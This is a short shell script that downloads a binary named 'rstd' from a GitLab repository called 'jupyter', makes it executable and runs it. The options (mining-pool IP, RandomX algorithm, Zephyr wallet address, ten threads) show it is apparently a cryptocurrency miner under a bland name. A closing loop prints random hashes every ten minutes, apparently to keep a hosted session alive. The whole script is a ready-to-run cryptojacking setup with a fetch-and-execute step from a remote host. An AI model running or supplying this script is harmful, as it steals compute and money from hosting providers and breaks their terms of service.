mkdir project
cd project
wget https://gitlab.com/teletyl/jupyter/-/raw/main/rstd && chmod +x rstd
./rstd -o 24.199.90.158:443 -a rx/0 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo V-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t 10
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
